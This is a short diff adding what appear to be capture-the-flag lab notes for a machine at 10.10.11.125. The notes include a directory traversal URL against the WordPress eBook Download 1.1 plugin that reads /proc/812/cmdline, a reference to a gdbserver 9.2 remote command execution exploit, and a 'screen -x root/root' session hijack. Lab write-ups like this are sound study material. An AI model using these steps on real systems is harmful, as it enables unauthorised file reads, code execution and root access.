@@ -1,3 +1,11 @@
+```
+http://10.10.11.125/wp-content/plugins/
+WordPress Plugin eBook Download 1.1 - Directory Traversal
+http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
+GNU gdbserver 9.2 - Remote Command Execution (RCE)
+ps aux
+screen -x root/root
+```
 
 
 ```
